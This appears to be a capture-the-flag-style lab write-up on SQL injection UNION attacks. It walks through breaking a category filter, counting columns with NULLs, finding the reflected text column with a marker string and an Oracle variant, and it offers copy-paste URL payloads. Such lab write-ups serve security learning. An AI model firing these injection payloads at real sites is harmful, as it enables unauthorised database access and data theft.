# SQL injection UNION attack, finding a column containing text

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Return string reflection from a query** (the reflected string appears at the **top of the page**).

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: return string reflection from a query, the string is found at the top of the page.**

2. **First we need to find the vulnerable path**

3. **`/filter?category=Corporate+gifts'` -> 500 status**

4. **`/filter?category=Corporate+gifts'+--+` -> fixed**

5. **enumerating columns: `Corporate+gifts'+UNION+SELECT+null,null,null+--+` -> returns 200**

6. **We replace each null with string until we get 200 and see reflection: `/filter?category=Corporate+gifts'+UNION+SELECT+null,'a',null+--+`**

7. **`/filter?category=Corporate+gifts'+UNION+SELECT+null,'jreCdX',null+--+` (jreCdX was my custom string)**

8. **Lab solved!**

---

## 🧠 Minimal Additions (Why / Tips)

- **UNION rules:** Your injected `UNION SELECT` must match the **exact number of columns** (and compatible types) returned by the original query. Step 5 confirms the count is **3**.
- **Finding the printed column:** Keep two columns as `NULL` and replace **one column at a time** with a unique marker string (e.g., `jreCdX`). The first payload that **renders your marker** reveals **which column is reflected**.
- **Why `NULL`?** It’s type-flexible and minimizes type mismatch errors during probing.
- **Comments:** `--` comments to end-of-line. `--+` works well in URLs because `+` decodes to a space (some engines require a space after `--`).
- **DB differences:** Selecting bare constants is fine on MySQL/PostgreSQL/SQL Server. **Oracle** requires a dummy table: `UNION SELECT NULL,'jreCdX',NULL FROM DUAL`.
- **Next steps:** Once you know which column is reflected, pivot to **version extraction** or dumping data by placing your **textual payload** in that reflected position.

---

## 🔧 Payloads I Used (Copy/Paste)

**Discovery & Fix:**
```txt
/filter?category=Corporate+gifts'
/filter?category=Corporate+gifts'--+
```

**Confirm 3 columns (adjust NULL count if needed):**
```txt
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL--+
```

**Probe reflection (swap your marker through each position):**
```txt
/filter?category=Corporate+gifts'+UNION+SELECT+'zPPY98',NULL,NULL--+
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,'zPPY98',NULL--+
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,'zPPY98'--+
```

**Oracle variant (requires DUAL):**
```txt
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,'zPPY98',NULL+FROM+DUAL--+
```

---

## 🏁 Result
- Identified that the **middle column** is reflected (per Step 7 with `zPPY98`), enabling targeted UNION payloads for data extraction. **Lab Solved. ✅**
